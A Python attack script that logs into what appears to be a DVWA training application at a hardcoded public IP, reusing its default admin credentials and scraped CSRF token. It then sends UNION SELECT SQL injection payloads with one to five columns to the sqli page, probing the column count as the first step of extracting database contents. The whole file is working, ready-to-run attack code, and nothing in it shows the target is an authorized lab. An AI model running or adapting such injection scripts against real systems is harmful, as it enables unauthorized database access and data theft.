
import requests
import re
import html

target_url = "http://31.97.117.123"
session = requests.Session()

# Login first
print("[*] Logging in...")
login_page = session.get(f"{target_url}/login.php")
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", login_page.text)
user_token = token_match.group(1) if token_match else None

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{target_url}/login.php", data=payload, allow_redirects=True)

# Test different number of columns - save full response
print("\n[*] Testing number of columns...")

for num_cols in range(1, 6):
    columns = ','.join([str(i) for i in range(1, num_cols + 1)])
    payload_str = f"999 UNION SELECT {columns}-- -"
    print(f"\n[*] Testing {num_cols} columns")
    
    try:
        params = {"id": payload_str, "Submit": "Submit"}
        response = session.get(f"{target_url}/vulnerabilities/sqli/", params=params, timeout=10)
        
        # Save full response for analysis
        if '<pre>' in response.text:
            start = response.text.find('<pre>')
            end = response.text.find('</pre>', start) + 6
            section = response.text[start:end]
            print(f"Response:\n{section}\n")
                
    except Exception as e:
        print(f"[-] Error: {str(e)}")

